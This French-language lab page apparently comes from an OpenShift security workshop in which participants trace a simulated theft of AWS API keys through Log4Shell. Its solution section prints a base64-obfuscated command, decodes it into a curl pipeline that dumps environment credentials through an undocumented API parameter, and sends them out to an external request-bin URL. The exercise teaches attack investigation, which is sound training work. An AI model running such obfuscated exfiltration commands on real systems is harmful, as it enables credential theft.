---
title: "Analyse d'un flux d'attaque"
draft: false
weight: 3
---

## Contexte

Nous sommes le 19 décembre 2021 (oui, vous avez bien lu, deux ans plus tôt, jour pour jour).

L'équipe cloud AWS vous averti qu'une clé d'API AWS a été compromise et a servi à déployer des logiciels de crypto mining.
Fort heureusement, votre société interdit la réutilisation des clés d'API pour plusieurs usages : vous êtes donc certain de l'origine de cette fuite de donnée : c'est l'application **visa-processor** qui exploite cette clé d'API.

```
$ oc rsh -n data-theft deploy/visa-processor /bin/sh -c 'env' | sort | grep ^A  
APP_ID=visa-processor
APP_ROOT=/opt/app-root
AWS_ACCESS_KEY_ID=Easy, peasy!
AWS_SECRET_ACCESS_KEY=Catch me if you can!
```

**Note** : les clés d'API AWS ont été caviardées dans le lab pour éviter une crise cardiaque inutile aux équipes sécurité **Red Hat**. Elles ont été remplacées par deux messages humoristiques. :)

Dans le même temps, l'équipe réseau vous averti de la présence d'un flux sortant inhabituel à destination de serveurs eux aussi hébergés sur AWS.

```
$ dig +short public.requestbin.com   
54.192.137.16
54.192.137.101
54.192.137.26
54.192.137.85
```

```
$ whois 18.155.129.83 |grep OrgTechName 
OrgTechName:   Amazon EC2 Network Operations
```

## Objectif de l'exercice

Votre mission, si vous l'acceptez, est d'investiguer l'environnement du Lab à la recherche du chemin parcouru par l'attaquant pour perpétrer cette exfiltration de données.
L'objectif est atteint quand vous trouvez l'URL du **Request Bin** utilisé par l'attaquant pour exfiltrer la clé d'API.

![Request Bin montrant la clé d'API AWS exfiltrée](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-Request-Bin.png)

## A vous de jouer !

Indices :

- Commencez par la section **Violations** et filtrez la vue avec `deployment:visa-processor namespace:data-theft`
- Basculez sur la section **Network Graph V2** et affichez les flux du cluster **local-cluster**, namespace **data-theft**. Cliquez sur les déploiements **information-service** et **back-office** et comparez leur flux. Lequel vous semble le plus suspicieux ?
- Retournez dans la section **Violations** et filtrez la vue avec le nom du déploiement qui vous semble le plus suspicieux.

## Solution

{{%expand "Solution" %}}

Naviguez dans la section **Violations** et filtrez la vue avec `deployment:visa-processor namespace:data-theft`.

![visa-processor violations](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-visa-processor-violations.png)

On note bien la présence de CVE mais rien de très suspicieux.

Basculez sur la section **Network Graph** et affichez les flux du cluster **local-cluster**, namespace **data-theft**.

Cliquez sur le déploiement **back-office**.

![back-office network graph](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-back-office-network-graph.png)

Les flux observés semblent légitimes.

Cliquez sur le déploiement **information-service**.

![information-service network graph](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-network-graph.png)

Observez le flux entrant depuis le router OpenShift et le flux sortant vers AWS.
Notez également que le déploiement **information-service** communique avec le déploiement **visa-processor**.

Naviguez dans la section **Violations** et filtrez la vue avec `deployment:information-service namespace:data-theft`.

![information-services violations](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-violations.png)

Notez la présence de la vulnérabilité **Log4Shell** ainsi que d'un comportement suspect au runtime: **Shell Spawned by Java Application**.

Cliquez sur la violation **Shell spawned by Java Application**.

![information-services violation Shell Spawned by Java Application](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-violation-shell-spawned.png)

Observez la commande exécutée :

```
echo Y3VybCAtc2sgLWQgJ3tcIm51bWJlck9mSWRlbnRpdGllc1wiOjR9JyBodHRwOi8vdmlzYS1wcm9jZXNzb3IuZGF0YS10aGVmdC5zdmM6ODA4MC9nZXRBcHBsaWNhdGlvbklkZW50aXR5IHwgY3VybCAtc2sgLS1kYXRhLWJpbmFyeSBALSAtSCAnQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyBodHRwczovL2VueWQxcnczcHd6M2EueC5waXBlZHJlYW0ubmV0Cg== | base64 -d | sh
```

Décodez le contenu encodé en base64 (utilisez la commande "base64 -d") :

```
$ echo Y3VybCAtc2sgLWQgJ3tcIm51bWJlck9mSWRlbnRpdGllc1wiOjR9JyBodHRwOi8vdmlzYS1wcm9jZXNzb3IuZGF0YS10aGVmdC5zdmM6ODA4MC9nZXRBcHBsaWNhdGlvbklkZW50aXR5IHwgY3VybCAtc2sgLS1kYXRhLWJpbmFyeSBALSAtSCAnQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyBodHRwczovL2VueWQxcnczcHd6M2EueC5waXBlZHJlYW0ubmV0Cg== | base64 -d

curl -sk -d '{\"numberOfIdentities\":4}' http://visa-processor.data-theft.svc:8080/getApplicationIdentity | curl -sk --data-binary @- -H 'Content-Type: text/plain' https://enyd1rw3pwz3a.x.pipedream.net
```

La première commande **curl** exploite un bug de l'application pour récupérer la clé d'API AWS.

En temps normal, le composant **visa-processor** retourne la valeur de sa variable d'environnement **APP_ID** :

```
$ curl -sk -X POST http://visa-processor.data-theft.svc:8080/getApplicationIdentity
{
    "APP_ID": "visa-processor"
}
```

Mais en passant un argument supplémentaire non documenté, on peux récupérer les variables d'environnement qui suivent (par ordre alphabétique) :

```
$ curl -sk -d '{"numberOfIdentities":4}' http://visa-processor.data-theft.svc:8080/getApplicationIdentity

{
    "APP_ID": "visa-processor",
    "APP_ROOT": "/opt/app-root",
    "AWS_ACCESS_KEY_ID": "Easy, peasy!",
    "AWS_SECRET_ACCESS_KEY": "Catch me if you can!"
}
```

La seconde commande **curl** exfiltre les données via le service **Request Bin**.
Connectez vous à [https://enyd1rw3pwz3a.x.pipedream.net](https://enyd1rw3pwz3a.x.pipedream.net) et confirmez que les données exfiltrées sont bien présentes.

{{% /expand%}}
